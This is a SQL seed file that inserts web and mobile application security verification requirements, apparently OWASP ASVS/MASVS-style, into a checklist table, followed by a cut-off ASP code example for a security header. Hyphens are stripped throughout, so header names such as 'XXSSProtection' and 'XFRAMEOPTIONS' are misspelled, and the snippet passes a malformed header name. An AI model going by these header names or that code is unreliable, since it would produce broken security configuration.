INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.13', 'Verify that the application is not susceptible to Remote File Inclusion (RFI) or Local File Inclusion (LFI) when content is used that is a path to a file.', '1', '173'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.0', 'Cryptography at rest verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.9', 'Verify that there is an explicit policy for how cryptographic keys are managed (e.g., generated, distributed, revoked, and expired). Verify that this key lifecycle is properly enforced.', '2', '121'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.4', 'Verify that secret keys, API tokens, or passwords are dynamically generated in mobile applications.', '1', '214'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.6', 'Verify that there is a method to remove each type of sensitive data from the application at the end of the required retention policy.', '3', '135'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.2', 'Verify that every HTTP response contains a content type header specifying a safe character set (e.g., UTF8, ISO 88591).', '1', '104'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.15', 'Verify that random numbers are created with proper entropy even when the application is under heavy load, or that the application degrades gracefully in such circumstances.', '3', '205'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.6', 'Verify that security logs are protected from unauthorized access and modification.', '2', '257'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.0', 'Session Management Verification Requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.4', 'Verify that untrusted data is not used within inclusion, class loader, or reflection capabilities to prevent remote/local file inclusion vulnerabilities.', '1', '250'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.9', 'Verify that the app does not export sensitive activities, intents, or content providers for other mobile apps on the same device to exploit.', '1', '219'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.0', 'Configuration', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.8', 'Verify that the XXSSProtection: 1; mode=block header is in place.', '1', '21'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.6', 'Verify that authorised administrators have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.', '3', '237'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.12', 'Verify that the application is not susceptible to OS Command Injection, or that security controls prevent OS Command Injection.', '1', '4'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.3', 'Verify that all sensitive data is sent to the server in the HTTP message body or headers (i.e., URL parameters are never used to send sensitive data).', '1', '72'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.6', 'Verify the use of sessionbased authentication and authorization. Please refer to sections 2, 3 and 4 for further guidance. Avoid the use of static "API keys" and similar.', '1', '152'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.25', 'Verify when parsing JSON in browsers, that JSON.parse is used to parse JSON on the client. Do not use eval() to parse JSON on the client.', '2', '181'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.14', 'Verify that proper certification revocation, such as Online Certificate Status Protocol (OSCP) Stapling, is enabled and configured.', '1', '139'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.7', 'Verify that the application does not log sensitive data as defined under local privacy laws or regulations, organizational sensitive data as defined by a risk assessment, or sensitive authentication data that could assist an attacker, including user''s session identifiers, passwords, hashes, or API tokens.', '2', '78'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.10', 'Verify that sensitive information maintained in memory is overwritten with zeros as soon as it no longer required, to mitigate memory dumping attacks.', '2', '220'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.10', 'Verify that TLS certificate public key pinning (HPKP) is implemented with production and backup public keys. For more information, please see the references below.', '2', '168'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.1', 'Verify that there is no custom session manager, or that the custom session manager is resistant against all common session management attacks.', '1', '132'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.3', 'Verify that sensitive data is not stored unprotected on the device, even in system protected areas such as key chains.', '1', '213'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.23', 'Verify that account lockout is divided into soft and hard lock status, and these are not mutually exclusive. If an account is temporarily soft locked out due to a brute force attack, this should not reset the hard lock status.', '2', '182'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.7', 'Verify the application minimizes the number of parameters in a request, such as hidden fields, Ajax variables, cookies and header values.', '2', '142'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.3', 'Verify that files obtained from untrusted sources are validated to be of expected type and scanned by antivirus scanners to prevent upload of known malicious content.', '1', '226'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.19', 'Verify there are no default passwords in use for the application framework or any components used by the application (such as "admin/password").', '1', '63'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.7', 'Verify that all application components are signed.', '3', '200'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('15.2', 'Verify the application has business limits and correctly enforces on a per user basis, with configurable alerting and automated reactions to automated or unusual attack.', '2', '125'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.4', 'Verify that a suitable XFRAMEOPTIONS header is in use for sites where content should not be viewed in a 3rdparty XFrame.', '2', '20'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.4', 'Verify that access to sensitive records is protected, such that only authorized objects or data is accessible to each user (for example, protect against users tampering with a parameter to see or alter another user''s account).', '1', '44'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.13', 'Ensure forward secrecy ciphers are in use to mitigate passive attackers recording traffic.', '1', '170'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.6', 'Verify that all API responses contain XContentTypeOptions: nosniff and ContentDisposition: attachment; filename="api.json" (or other appropriate filename for the content type).', '1', '193'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.11', 'Verify that all application components, libraries, modules, frameworks, platform, and operating systems are free from known vulnerabilities.', '2', '208'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.26', 'Verify that authenticated data is cleared from client storage, such as the browser DOM, after the session is terminated.', '2', '249'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.2', 'Verify that untrusted file data submitted to the application is not used directly with file I/O commands,particularly to protect against path traversal, local file include, file mime type, and OS command injection vulnerabilities.', '1', '225'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.1', 'Verify that the same encoding style is used between the client and the server.', '1', '33'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('13.1', 'Verify all malicious activity is adequately sandboxed, containerized or isolated to delay and deter attackers from attacking other applications.', '3', '239'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.9', 'Ensure that build processes for system level languages have all security flags enabled, such as ASLR, DEP, and security checks.', '3', '201'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.11', 'Verify that HTTP Strict Transport Security headers are included on all requests and for all subdomains, such as StrictTransportSecurity: maxage=15724800; includeSubdomains', '1', '192'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.15', 'Verify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy, including root and intermediary certificates of your selected certifying authority.', '1', '198'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.12', 'Verify that production website URL has been submitted to preloaded list of Strict Transport Security domains maintained by web browser vendors.', '3', '255'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.18', 'Verify that information enumeration is not possible via login, password reset, or forgot account functionality.', '1', '70'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.10', 'Verify that all user and data attributes and policy information used by access controls cannot be manipulated by end users unless specifically authorized.', '2', '258'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.6', 'Verify that all random numbers, random file names, random GUIDs, and random strings are generated using the cryptographic module''s approved random number generator when these random values are intended to be not guessable by an attacker.', '2', '118'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.7', 'Verify that a content security policy (CSPv2) is in place that helps mitigate common DOM, XSS, JSON, and JavaScript injection vulnerabilities.', '1', '178'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.4', 'Verify that backend TLS connection failures are logged.', '3', '103'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.10', 'Verify that all application assets are hosted by the application, such as JavaScript libraries, CSS stylesheets and web fonts are hosted by the application rather than rely on a CDN or external provider.', '3', '223'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.20', 'Verify that antiautomation is in place to prevent breached credential testing, brute forcing, and account lockout attacks.', '1', '29'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.0', 'Web services verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.2', 'Verify that forms containing credentials are not filled in by the application. Prefilling by the application implies that credentials are stored in plaintext or a reversible format, which is explicitly prohibited.', '1', '113'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.17', 'Verify that an active session list is displayed in the account profile or similar of each user. The user should be able to terminate any active session.', '1', '253'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.8', 'Verify that access controls fail securely.', '1', '242'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.4', 'Verify that each log event includes necessary information that would allow for a detailed investigation of the timeline when an event happens.', '2', '99'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.21', 'Verify that all authentication credentials for accessing services external to the application are encrypted and stored in a protected location.', '2', '65'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.19', 'Verify that all input data is validated, not only HTML form fields but all sources of input such as REST calls, query parameters, HTTP headers, cookies, batch files, RSS feeds, etc; using positive validation (whitelisting), then lesser forms of validation such as greylisting (eliminating known bad strings), or rejecting bad inputs (blacklisting).', '2', '167'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.12', 'Verify that all authentication decisions can be logged, without storing sensitive session identifiers or passwords. This should include requests with relevant metadata needed for security investigations.', '2', '76'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.6', 'Verify that all connections to external systems that involve sensitive information or functions are authenticated.', '2', '84'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.2', 'Verify that sessions are invalidated when the user logs out.', '1', '57'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.31', 'Verify that if an application allows users to authenticate, they can authenticate using twofactor authentication or other strong authentication, or any similar scheme that provides protection against username + password disclosure.', '2', '231'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.13', 'Verify that the application or framework uses strong random antiCSRF tokens or has another transaction protection mechanism.', '1', '5'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.3', 'Verify that XML or JSON schema is in place and verified before accepting input.', '1', '175'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.27', 'Verify that measures are in place to block the use of commonly chosen passwords and weak passphrases.', '1', '222'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.7', 'Verify all security controls (including libraries that call external security services) have a centralized implementation.', '2', '184'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.14', 'Verify that the application is not susceptible to common XML attacks, such as XPath query tampering, XML External Entity attacks, and XML injection attacks.', '1', '183'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.9', 'Verify that the changing password functionality includes the old password, the new password, and a password confirmation.', '1', '86'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.0', 'Data protection verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.4', 'Verify that the application sets appropriate anticaching headers as per the risk of the application, such as the following:
    Expires: Tue, 03 Jul 2001 06:00:00 GMT 
    LastModified: {now} GMT
    CacheControl: nostore, nocache, mustrevalidate, maxage=0 CacheControl: postcheck=0, precheck=0
    Pragma: nocache', '1', '19'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.1', 'Verify that the principle of least privilege exists  users should only be able to access functions, data files, URLs, controllers, services, and other resources, for which they possess specific authorization. This implies protection against spoofing and elevation of privilege.', '1', '126'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.8', 'Verify that third party components come from trusted repositories.', '3', '238'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.5', 'Verify that SOAP based web services are compliant with Web ServicesInteroperability (WSI) Basic Profile at minimum. This essentially means TLS encryption.', '1', '197'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.8', 'Verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection.', '3', '236'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.13', 'Verify that account passwords are one way hashed with a salt, and there is sufficient work factor to defeat brute force and password hash recovery attacks.', '2', '51'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.11', 'Verify that the application is not susceptible to LDAP Injection, or that security controls prevent LDAP Injection.', '1', '11'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.6', 'Biometric authentication, if any, is not eventbound (i.e. using an API that simply returns "true" or "false"). Instead, it is based on unlocking the keychain/keystore.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.3', 'The app uses cryptographic primitives that are appropriate for the particular usecase, configured with parameters that adhere to industry best practices.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.3', 'The remote endpoint terminates the existing session when the user logs out.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.3', 'The app verifies the X.509 certificate of the remote endpoint when the secure channel is established. Only certificates signed by a valid CA are accepted.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.8', 'Free security features offered by the toolchain, such as bytecode minification, stack protection, PIE support and automatic reference counting, are activated.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.10', 'The app informs the user of all login activities with his or her account. Users are able view a list of devices used to access the account, and to block specific devices.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.0', 'Network Communication Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.9', 'Stepup authentication is required to enable actions that deal with sensitive data or transactions.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.4', 'The app either uses its own certificate store, or pins the endpoint certificate or public key, and subsequently does not establish connections with endpoints that offer a different certificate or key, even if signed by a trusted CA.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.5', 'The remote endpoint implements an exponential backoff, or temporarily locks the user account, when incorrect authentication credentials are submitted an excessive number of times .', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.6', 'All random values are generated using a sufficiently secure random number generator.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.1', 'Data is encrypted on the network using TLS. The secure channel is used consistently throughout the app.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.5', 'The app doesn''t reuse the same cryptographic key for multiple purposes.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.2', 'The TLS settings are in line with current best practices, or as close as possible if the mobile operating system does not support the recommended standards.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.4', 'A password policy exists and is enforced at the remote endpoint.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.8', 'A second factor of authentication exists at the remote endpoint and the 2FA requirement is consistently enforced.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.1', 'If the app provides users with access to a remote service, an acceptable form of authentication such as username/password authentication is performed at the remote endpoint.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.2', 'The remote endpoint uses randomly generated access tokens toauthenticate client requests without sending the user''s credentials.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.4', 'The app does not use cryptographic protocols or algorithms that are widely considered depreciated for security purposes.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.7', 'Sessions are terminated at the remote endpoint after a predefined period of inactivity.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.5', 'JavaScript is disabled in WebViews unless explicitly required.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.5', 'Data considered sensitive in the context of the mobile app is clearly identified.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.2', 'The app uses proven implementations of cryptographic primitives.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.9', 'Obfuscating transformations and functional defenses are interdependent and wellintegrated throughout the app.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.4', 'The keyboard cache is disabled on text inputs that process sensitive data.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.5', 'The app catches and handles possible exceptions.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.12', 'The app educates the user about the types of personally identifiable information processed, as well as security best practices the user should follow in using the app.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.10', 'All components that are not part of the application but that the application relies on to operate, are clearly identified and the security implications of using those components are known.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.2', 'All third party components used by the mobile app, such as libraries and frameworks, are identified, and checked for known vulnerabilities.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.6', 'The app detects, and responds to, modifications of process memory, such as relocation table patches and injected code.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.7', 'A threat model for the mobile app and the associated remote services has been produced that identifies potential threats and countermeasures.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.0', 'Authentication and Session Management Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.1', 'System credential storage facilities are used appropriately to store sensitive data, such as user credentials or cryptographic keys.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.9', 'Object serialization, if any, is implemented using safe serialization APIs.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.7', 'The app does not load usersupplied local resources into WebViews.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.1', 'All app components are identified and known to be needed.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.3', 'The app detects, and responds to, tampering with executable files and critical data.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.1', 'The app only requests the minimum set of permissions necessary.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.13', 'Security is addressed within all parts of the software development lifecycle.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.1', 'The app is signed and provisioned with valid certificate.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.0', 'Code Quality and Build Setting Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.8', 'No sensitive data is included in backups generated by the mobile operating system.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.2', 'No sensitive data is written to application logs.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.13', 'If the architecture requires sensitive computations be performed on the clientside, these computations are isolated from the operating system by using a hardwarebased SE / TEE. Alternatively, the information is protected using obfuscation. Considering current published research, the obfuscation type and parameters are sufficient to cause significant manual effort for reverse engineers seeking to comprehend the sensitive portions of the code and/or data.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.7', 'In unmanaged code, memory is allocated, freed and used securely.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.6', 'All app components are defined in terms of the business functions and/or security functions they provide.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.2', 'The app implements multiple functionally independent debugging defenses that, in context of the overall protection scheme, force adversaries to invest considerable manual effort to enable debugging. All available debugging protocols must be covered (e.g. JDWP and native).', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.0', 'Data Storage and Privacy Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.10', 'The app detects whether it is being executed on a rooted or jailbroken device. Depending on the business requirement, users are warned, or the app is terminated if the device is rooted or jailbroken.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.6', 'No sensitive data is exposed via IPC mechanisms.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.8', 'All executable files and libraries belonging to the app are either encrypted on the file level and/or important code and data segments inside the executables are encrypted or packed. Trivial static analysis does not reveal important code or data.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.4', 'The app does not export sensitive functionality through IPC facilities, unless these mechanisms are properly protected.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.2', 'The app has been built in release mode, with settings appropriate for a release build (e.g. nondebuggable).', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.9', 'All security controls have a centralized implementation.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.11', 'The app enforces a minimum deviceaccesssecurity policy, such as requiring the user to set a device passcode.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.5', 'The app doesn''t rely on a single insecure communication channel (email or SMS) for critical operations, such as enrolments and account recovery.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.12', 'If the architecture requires sensitive information be stored on the device, the app only runs on operating system versions and devices that offer hardwarebacked key storage. Alternatively, the information is protected using obfuscation. Considering current published research, the obfuscation type and parameters are sufficient to cause significant manual effort for reverse engineers seeking to comprehend or extract the sensitive data.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.11', 'The app uses multiple functionally independent methods of emulator detection that, in context of the overall protection scheme, force adversaries to invest significant manual effort to run the app in an emulator (supersedes requirement 8.7).', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.10', 'The app does not hold sensitive data in memory longer than necessary, and memory is cleared explicitly after use.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.3', 'Debugging symbols have been removed from native binaries.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.0', 'Resiliency Against Reverse Engineering Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.8', 'All third party components have been assessed (associated risks) before being used or implemented. A process is in place to ensure that each time a security update for a third party component is published, the change is inspected and the risk evaluated.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.0', 'Architecture, Design and Threat Modelling Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.7', 'No sensitive data, such as passwords and credit card numbers, is exposed through the user interface or leaks to screenshots.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.7', 'The app implements multiple different responses to tampering, debugging and emulation, including stealthy responses that don''t simply terminate the app.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.3', 'The app does not export sensitive functionality via custom URL schemes, unless these mechanisms are properly protected.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.1', 'The app implements two or more functionally independent methods of root detection and responds to the presence of a rooted device either by alerting the user or terminating the app.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.6', 'Error handling logic in security controls denies access by default.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.9', 'The app removes sensitive data from views when backgrounded.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.3', 'No sensitive data is shared with third parties unless it is a necessary part of the architecture.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.12', 'Remote endpoints verify that connecting clients use an uptodate version of the mobile app.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.2', 'All inputs from external sources and the user are validated and, if necessary, sanitized. This includes data received via the UI, IPC mechanisms such as intents, custom URLs, and network sources.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.8', 'If Java objects are exposed in a WebView, verify that the WebView only renders JavaScript contained within the app package.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.4', 'The app detects the presence of widely used reverse engineering tools, such as code injection tools, hooking frameworks and debugging servers.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.5', 'The app detects, and response to, being run in an emulator using any method.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.3', 'Security controls are never enforced only on the client side, but on the respective remote endpoints.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.11', 'There is an explicit policy for how cryptographic keys (if any) are managed, and the lifecycle of cryptographic keys is enforced. Ideally, follow a key management standard such as NIST SP 80057.', '2', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.0', 'Platform Interaction Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.0', 'Cryptography Requirements', '0', '400'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.4', 'Debugging code has been removed, and the app does not log verbose errors or debugging messages.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.5', 'The clipboard is deactivated on text fields that may contain sensitive data.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.10', 'The app implements a ''device binding'' functionality using a device fingerprint derived from multiple properties unique to the device.', 'R', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.1', 'The app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.4', 'A highlevel architecture for the mobile app and all connected remote services has been defined and security has been addressed in that architecture.', '1', '999'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('6.6', 'WebViews are configured to allow only the minimum set of protocol handlers required (ideally, only https is supported). Potentially dangerous handlers, such as file, tel and appid, are disabled.', '1', '999'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('XXSSProtection header


 Example:


    /*
    In order to set the XXSSProtection header, you''ll have to add the following 
    code to the head of your application, the following code could be used in your controller:
    */
    
    Response.AppendHeader("XXSSProtection:1", "mode=block"); 

	/*
	In your classes you can use the following code:
	*/
	
	HttpContext.Current.Response.AppendHeader("XXSSProtection:1", "mode=block");
	

', 'X XSS Protection Header', 'asp'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES ('Session cookies (domain)


 Example:


	/*
	Setting the "Domain" attribute to a too permissive value, such as "example.com" 
	allows an attacker to launch attacks on the session IDs between different hosts and 
	web applications belonging to the same domain, known as crosssubdomain cookies.
	For example, vulnerabilities in www.example.com might allow an attacker to get access 
